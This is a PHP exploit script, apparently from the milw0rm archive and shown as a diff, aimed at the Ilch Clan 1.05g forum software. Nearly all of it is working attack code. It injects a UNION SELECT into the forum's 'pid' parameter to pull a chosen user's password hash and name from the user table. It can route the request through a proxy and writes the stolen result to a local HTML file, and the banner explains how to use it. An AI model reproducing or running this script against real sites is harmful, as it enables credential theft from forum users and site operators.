@@ -1,0 +1,72 @@
+<?
+error_reporting(E_ERROR);
+
+function xss_init()
+{
+    if (!extension_loaded('php_curl'))
+    {
+       if (!dl('curl.so') and !dl('php_curl.so') and !dl('php_curl.dll'))
+       die ("oo error - cannot load curl extension!");
+    }
+}
+
+function xss_header()
+{
+    echo "\noooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo";
+    echo "                                  oo    ooooooo     ooooooo\n";
+    echo "                    oooo   oooo o888  o88     888 o888   888o\n";
+    echo "                      888o888    888        o888   888888888\n";
+    echo "                      o88888o    888     o888   o 888o   o888\n";
+    echo "                    o88o   o88o o888o o8888oooo88   88ooo88\n";
+    echo "oooooooooooooooooooooooooooooo bxcp 0.299 exploit oooooooooooooooooooooooooooooo\n";
+    echo "oo usage          $ php ilchclan-105g-exploit.php [url] [post id] [user id]\n";
+    echo "oo proxy support  $ php ilchclan-105g-exploit.php [url] [post id] [user id]\n";
+    echo "                    [proxy]:[port]\n";
+    echo "oo [post id]      id of a post in the forum where a guest have the permission\n";
+    echo "                  to write a reply with a quote\n";
+    echo "oo example        $ php ilchclan-105g-exploit.php http://localhost 1 1\n";
+    echo "oo open the file ilchclan_pw.html - there you find the password of the user\n\n";
+}
+
+function xss_bottom()
+{
+    echo "\noo discover : x128 - alexander wilhelm - 21/02/2006\n";
+    echo "oo contact  : exploit <at> x128.net                    oo website : www.x128.net";
+}
+
+function xss_exploit()
+{
+    $xss_target = $_SERVER['argv'][1] . "/index.php";
+    $xss_http_get = "?m=forum&um=newpost&tid=" . $_SERVER['argv'][2] . "&pid=" . urlencode("0 UNION SELECT pass, name FROM prefix_user WHERE id = ". $_SERVER['argv'][3] ."/*");
+
+    $xss_connection = curl_init();
+
+    if ($_SERVER['argv'][4])
+    {
+        curl_setopt($xss_connection, CURLOPT_TIMEOUT, 8);
+        curl_setopt($xss_connection, CURLOPT_PROXY, $_SERVER['argv'][4]);
+    }
+
+    curl_setopt ($xss_connection, CURLOPT_URL, $xss_target . $xss_http_get);
+    curl_setopt ($xss_connection, CURLOPT_HEADER, 0);
+    curl_setopt ($xss_connection, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt ($xss_connection, CURLOPT_USERAGENT, 'x128');
+
+    $xss_source = curl_exec($xss_connection) or die("oo error - cannot connect!\n");
+
+    if ($xss_source) echo "oo dafaced ...\n";
+
+    $xss_output = fopen("ilchclan_pw.html","w");
+    fputs($xss_output, $xss_source);
+    fclose($xss_output);
+
+    curl_close ($xss_connection); 
+}
+
+xss_init();
+xss_header();
+xss_exploit();
+xss_bottom();
+?>
+
+# milw0rm.com [2006-02-20]
